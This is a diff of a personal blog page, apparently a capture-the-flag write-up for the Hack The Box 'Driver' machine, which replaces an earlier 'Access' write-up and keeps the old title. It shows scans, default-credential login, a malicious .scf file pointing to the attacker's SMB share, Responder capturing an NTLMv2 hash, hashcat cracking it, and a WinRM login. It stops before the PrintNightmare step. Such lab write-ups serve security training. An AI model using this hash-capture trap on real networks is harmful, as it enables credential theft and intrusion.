@@ -8,19 +8,19 @@
 <link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
 <title>HTB Access Write-up | Jordan&#39;s Blog</title>
 <meta name="title" content="HTB Access Write-up" />
-<meta name="description" content="A write-up for the Access box." />
+<meta name="description" content="A write-up for the Driver box." />
 <meta name="keywords" content="HTB,Pentesting," />
 
 
 <meta property="og:url" content="https://jordangalida.github.io/htb-access-write-up/">
   <meta property="og:site_name" content="Jordan&#39;s Blog">
   <meta property="og:title" content="HTB Access Write-up">
-  <meta property="og:description" content="A write-up for the Access box.">
+  <meta property="og:description" content="A write-up for the Driver box.">
   <meta property="og:locale" content="en_US">
   <meta property="og:type" content="article">
     <meta property="article:section" content="blog">
-    <meta property="article:published_time" content="2025-02-06T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-02-06T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-02-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-18T00:00:00+00:00">
     <meta property="article:tag" content="HTB">
     <meta property="article:tag" content="Pentesting">
     <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
@@ -31,16 +31,16 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
   <meta name="twitter:title" content="HTB Access Write-up">
-  <meta name="twitter:description" content="A write-up for the Access box.">
+  <meta name="twitter:description" content="A write-up for the Driver box.">
 
 
 
 
   <meta itemprop="name" content="HTB Access Write-up">
-  <meta itemprop="description" content="A write-up for the Access box.">
-  <meta itemprop="datePublished" content="2025-02-06T00:00:00+00:00">
-  <meta itemprop="dateModified" content="2025-02-06T00:00:00+00:00">
-  <meta itemprop="wordCount" content="664">
+  <meta itemprop="description" content="A write-up for the Driver box.">
+  <meta itemprop="datePublished" content="2025-02-18T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-18T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1103">
   <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
   <meta itemprop="keywords" content="HTB,Pentesting">
 <meta name="referrer" content="no-referrer-when-downgrade" />
@@ -223,112 +223,241 @@
 <h1>HTB Access Write-up</h1>
 <p>
   <i>
-    <time datetime='2025-02-06'>
-      06 Feb, 2025
+    <time datetime='2025-02-18'>
+      18 Feb, 2025
     </time>
   </i>
 </p>
 
 <content>
-  <p>Starting off with our nmap scans.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.10.98 -oA Scans/access_top1k
+  <p>This box starts off with a website where you can upload printer drivers, which is a hint to a known critical vulnerability that happened pretty recently. The website says that anything uploaded will be reviewed by someone. In order to gain initial access, you need to upload a file that will execute when viewed such as a <code>.scf</code> or <code>.lnk</code> file that reaches out to an SMB server that we control while running a tool like <code>Responder</code>. This allows you to catch an NTLMv2 hash that can be cracked to gain access as the user Tony. To escalate privileges, you exploit the <code>PrintNightmare</code> vulnerability.</p>
+<hr>
+<p>We start off with our nmap scans</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.11.106 -oA driver_top1k
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 13:58 EST
-</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.98
-</span></span><span style="display:flex;"><span>Host is up (0.026s latency).
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 18:44 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.106
+</span></span><span style="display:flex;"><span>Host is up (0.028s latency).
 </span></span><span style="display:flex;"><span>Not shown: 997 filtered tcp ports (no-response)
 </span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
-</span></span><span style="display:flex;"><span>21/tcp open  ftp
-</span></span><span style="display:flex;"><span>23/tcp open  telnet
-</span></span><span style="display:flex;"><span>80/tcp open  http
-</span></span></code></pre></div><p>We will do another scan with scripting enabled, and service/version checks on all ports.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.10.98 -oA Scans/access_all                                                                                                              
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 13:59 EST
-</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.98
-</span></span><span style="display:flex;"><span>Host is up (0.027s latency).
-</span></span><span style="display:flex;"><span>Not shown: 65532 filtered tcp ports (no-response)
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>21/tcp open  ftp     Microsoft ftpd
-</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-</span></span><span style="display:flex;"><span>|_Can&#39;t get directory listing: PASV failed: 425 Cannot open data connection.
-</span></span><span style="display:flex;"><span>| ftp-syst:
-</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
-</span></span><span style="display:flex;"><span>23/tcp open  telnet  Microsoft Windows XP telnetd
-</span></span><span style="display:flex;"><span>| telnet-ntlm-info:
-</span></span><span style="display:flex;"><span>|   Target_Name: ACCESS
-</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: ACCESS
-</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: ACCESS
-</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: ACCESS
-</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: ACCESS
-</span></span><span style="display:flex;"><span>|_  Product_Version: 6.1.7600
-</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 7.5
-</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
-</span></span><span style="display:flex;"><span>|_http-title: MegaCorp
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp  open  http
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span></code></pre></div><p>We do another to scan all ports with scripting and version detection enabled</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sV -sC -p- 10.10.11.106 -oA driver_all
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 19:07 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.106
+</span></span><span style="display:flex;"><span>Host is up (0.026s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65531 filtered tcp ports (no-response)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp   open  http         Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
 </span></span><span style="display:flex;"><span>| http-methods:
 </span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
-</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+</span></span><span style="display:flex;"><span>| http-auth:
+</span></span><span style="display:flex;"><span>| HTTP/1.1 401 Unauthorized\x0D
+</span></span><span style="display:flex;"><span>|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+</span></span><span style="display:flex;"><span>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
-</span></span><span style="display:flex;"><span>|_clock-skew: 1s
-</span></span></code></pre></div><p>All open ports are very interesting. Let&rsquo;s start going through each service. Starting off with FTP, let&rsquo;s see if we can view any files.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ftp 10.10.10.98
-</span></span><span style="display:flex;"><span>Connected to 10.10.10.98.
-</span></span><span style="display:flex;"><span>220 Microsoft FTP Service
-</span></span><span style="display:flex;"><span>Name (10.10.10.98:jsmooth): anonymous
-</span></span><span style="display:flex;"><span>331 Anonymous access allowed, send identity (e-mail name) as password.
-</span></span><span style="display:flex;"><span>Password:
-</span></span><span style="display:flex;"><span>230 User logged in.
-</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
-</span></span><span style="display:flex;"><span>ftp&gt; ls
-</span></span><span style="display:flex;"><span>425 Cannot open data connection.
-</span></span><span style="display:flex;"><span>200 PORT command successful.
-</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
-</span></span><span style="display:flex;"><span>08-23-18  08:16PM       &lt;DIR&gt;          Backups
-</span></span><span style="display:flex;"><span>08-24-18  09:00PM       &lt;DIR&gt;          Engineer
-</span></span><span style="display:flex;"><span>226 Transfer complete.
-</span></span></code></pre></div><p>Looks like we have access to two directories. Each directory has a file in it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>ftp&gt; cd Backups
-</span></span><span style="display:flex;"><span>250 CWD command successful.
-</span></span><span style="display:flex;"><span>ftp&gt; ls
-</span></span><span style="display:flex;"><span>200 PORT command successful.
-</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
-</span></span><span style="display:flex;"><span>08-23-18  08:16PM              5652480 backup.mdb
-</span></span><span style="display:flex;"><span>226 Transfer complete.
-</span></span><span style="display:flex;"><span>ftp&gt; cd ..
-</span></span><span style="display:flex;"><span>250 CWD command successful.
-</span></span><span style="display:flex;"><span>ftp&gt; cd Engineer
-</span></span><span style="display:flex;"><span>250 CWD command successful.
-</span></span><span style="display:flex;"><span>ftp&gt; ls
-</span></span><span style="display:flex;"><span>200 PORT command successful.
-</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
-</span></span><span style="display:flex;"><span>08-24-18  12:16AM                10870 Access Control.zip
-</span></span><span style="display:flex;"><span>226 Transfer complete.
-</span></span></code></pre></div><p>Looks like we have a zip file and a Microsoft Access Database.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$file backup.mdb
-</span></span><span style="display:flex;"><span>backup.mdb: Microsoft Access Database
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2025-02-19T07:09:54
+</span></span><span style="display:flex;"><span>|_  start_date: 2025-02-19T06:39:18
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled (dangerous, but default)
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$file <span style="color:#e6db74">&#39;Access Control.zip&#39;</span>
-</span></span><span style="display:flex;"><span>Access Control.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
-</span></span></code></pre></div><p>Trying to unzip the file results in an error and we need to use 7z. It asks us for a password. Let&rsquo;s try to crack this archive.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$zip2john Access_Control.zip &gt; zip.hash
-</span></span><span style="display:flex;"><span>Created directory: /home/jsmooth/.john
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 155.05 seconds
+</span></span></code></pre></div><p>Let&rsquo;s check out the website and see if there are any SMB shares we can view</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N -L //10.10.11.106/
+</span></span><span style="display:flex;"><span>session setup failed: NT_STATUS_ACCESS_DENIED
+</span></span></code></pre></div><p>No dice. Let&rsquo;s look at the website. Immediately upon visiting the website, we are asked to login
+<img src="/images/Driver/login.png" alt="Login"></p>
+<p>We try a simple credential pair <code>admin:admin</code> and we get in
+<img src="/images/Driver/homepage.png" alt="Homepage"></p>
+<p>On the /fw_up.php page it looks like we can upload firmware
+<img src="/images/Drive/firmware" alt="Firmware"></p>
+<p>Since this is a Windows box, let&rsquo;s try to upload a reverse shell. Nothing. It says that a user will review the files, so can we get something to execute when someone visits wherever this file is being uploaded? Yes, we can use a .lnk or .scf file</p>
+<pre tabindex="0"><code class="language-scf" data-lang="scf">$cat click.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.24\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre><p>Then set up responder, and upload the file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo responder -I tun0 -w
+</span></span><span style="display:flex;"><span>                                         __
+</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+</span></span><span style="display:flex;"><span>                   |__|
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt zip.hash
-</span></span></code></pre></div><p>However, this failed. Let&rsquo;s see if we can find some credentials in the Access database. We can use <code>mdb-table</code> from mdbtools.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$mdb-tables backup.mdb
-</span></span><span style="display:flex;"><span>acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
-</span></span></code></pre></div><p>Let&rsquo;s take a look at the auth_user field.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$mdb-export backup.mdb auth_user
-</span></span><span style="display:flex;"><span>id,username,password,Status,last_login,RoleID,Remark
-</span></span><span style="display:flex;"><span>25,&#34;admin&#34;,&#34;admin&#34;,1,&#34;08/23/18 21:11:47&#34;,26,
-</span></span><span style="display:flex;"><span>27,&#34;engineer&#34;,&#34;access4u@security&#34;,1,&#34;08/23/18 21:13:36&#34;,26,
-</span></span><span style="display:flex;"><span>28,&#34;backup_admin&#34;,&#34;admin&#34;,1,&#34;08/23/18 21:14:02&#34;,26,
-</span></span></code></pre></div><p>We find usernames and passwords. Let&rsquo;s try to use them to unzip the archive.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$7z x Access_Control.zip
-</span></span></code></pre></div><p>The second password, &ldquo;access4usecurity&rdquo; ends up working. The extracted file is a .pst file which is a Personal Storage Table for Outlook.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$file <span style="color:#e6db74">&#39;Access Control.pst&#39;</span>
-</span></span><span style="display:flex;"><span>Access Control.pst: Microsoft Outlook Personal Storage (&gt;=2003, Unicode, version 23), dwReserved1=0x234, dwReserved2=0x22f3a, bidUnused=0000000000000000, dwUnique=0x39, 271360 bytes, bCryptMethod=1, CRC32 0x744a1e2e
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  To support this project:
+</span></span><span style="display:flex;"><span>  Patreon -&gt; https://www.patreon.com/PythonResponder
+</span></span><span style="display:flex;"><span>  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+</span></span><span style="display:flex;"><span>  To kill this script hit CTRL-C
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Poisoners:
+</span></span><span style="display:flex;"><span>    LLMNR                      [ON]
+</span></span><span style="display:flex;"><span>    NBT-NS                     [ON]
+</span></span><span style="display:flex;"><span>    MDNS                       [ON]
+</span></span><span style="display:flex;"><span>    DNS                        [ON]
+</span></span><span style="display:flex;"><span>    DHCP                       [OFF]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Servers:
+</span></span><span style="display:flex;"><span>    HTTP server                [ON]
+</span></span><span style="display:flex;"><span>    HTTPS server               [ON]
+</span></span><span style="display:flex;"><span>    WPAD proxy                 [ON]
+</span></span><span style="display:flex;"><span>    Auth proxy                 [OFF]
+</span></span><span style="display:flex;"><span>    SMB server                 [ON]
+</span></span><span style="display:flex;"><span>    Kerberos server            [ON]
+</span></span><span style="display:flex;"><span>    SQL server                 [ON]
+</span></span><span style="display:flex;"><span>    FTP server                 [ON]
+</span></span><span style="display:flex;"><span>    IMAP server                [ON]
+</span></span><span style="display:flex;"><span>    POP3 server                [ON]
+</span></span><span style="display:flex;"><span>    SMTP server                [ON]
+</span></span><span style="display:flex;"><span>    DNS server                 [ON]
+</span></span><span style="display:flex;"><span>    LDAP server                [ON]
+</span></span><span style="display:flex;"><span>    RDP server                 [ON]
+</span></span><span style="display:flex;"><span>    DCE-RPC server             [ON]
+</span></span><span style="display:flex;"><span>    WinRM server               [ON]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] HTTP Options:
+</span></span><span style="display:flex;"><span>    Always serving EXE         [OFF]
+</span></span><span style="display:flex;"><span>    Serving EXE                [OFF]
+</span></span><span style="display:flex;"><span>    Serving HTML               [OFF]
+</span></span><span style="display:flex;"><span>    Upstream Proxy             [OFF]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Poisoning Options:
+</span></span><span style="display:flex;"><span>    Analyze Mode               [OFF]
+</span></span><span style="display:flex;"><span>    Force WPAD auth            [OFF]
+</span></span><span style="display:flex;"><span>    Force Basic Auth           [OFF]
+</span></span><span style="display:flex;"><span>    Force LM downgrade         [OFF]
+</span></span><span style="display:flex;"><span>    Force ESS downgrade        [OFF]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Generic Options:
+</span></span><span style="display:flex;"><span>    Responder NIC              [tun0]
+</span></span><span style="display:flex;"><span>    Responder IP               [10.10.14.24]
+</span></span><span style="display:flex;"><span>    Responder IPv6             [dead:beef:2::1016]
+</span></span><span style="display:flex;"><span>    Challenge set              [random]
+</span></span><span style="display:flex;"><span>    Don&#39;t Respond To Names     [&#39;ISATAP&#39;]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Current Session Variables:
+</span></span><span style="display:flex;"><span>    Responder Machine Name     [WIN-6AUOB2VBSPK]
+</span></span><span style="display:flex;"><span>    Responder Domain Name      [WG6O.LOCAL]
+</span></span><span style="display:flex;"><span>    Responder DCE-RPC Port     [48873]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Listening for events...
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[SMB] NTLMv2-SSP Client   : 10.10.11.106
+</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Username : DRIVER\tony
+</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Hash     : tony::DRIVER:e61c06821dd7d97b:04C5D97EC19DB7997DB3D4C22BB85E03:010100000000000080270D804D82DB01340387C218E4BE3500000000020008005700470036004F0001001E00570049004E002D003600410055004F004200320056004200530050004B0004003400570049004E002D003600410055004F004200320056004200530050004B002E005700470036004F002E004C004F00430041004C00030014005700470036004F002E004C004F00430041004C00050014005700470036004F002E004C004F00430041004C000700080080270D804D82DB0106000400020000000800300030000000000000000000000000200000087AC8875FCF9D30115565877B7878955455C2EF04BE88643C220A9FCB19D0600A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003400000000000000000000000000
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span></code></pre></div><p>We receive a hash! Let&rsquo;s try to crack it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$hashcat -m <span style="color:#ae81ff">5600</span> tony_hash /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt; 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>TONY::DRIVER:e61c06821dd7d97b:04c5d97ec19db7997db3d4c22bb85e03:010100000000000080270d804d82db01340387c218e4be3500000000020008005700470036004f0001001e00570049004e002d003600410055004f004200320056004200530050004b0004003400570049004e002d003600410055004f004200320056004200530050004b002e005700470036004f002e004c004f00430041004c00030014005700470036004f002e004c004f00430041004c00050014005700470036004f002e004c004f00430041004c000700080080270d804d82db0106000400020000000800300030000000000000000000000000200000087ac8875fcf9d30115565877b7878955455c2ef04be88643c220a9fcb19d0600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003400000000000000000000000000:liltony
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>And we crack the password! Now we can log in since WinRM is open</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.11.106 -u TONY -p liltony
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt;
+</span></span></code></pre></div><p>We can grab the user flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>f37fe958f29a555e286267d4a15a0fc0
+</span></span></code></pre></div><p>With everything so far being about printers, it would be appropriate to check for the PrintNightmare vulnerability. Let&rsquo;s check if the spooler service is running</p>
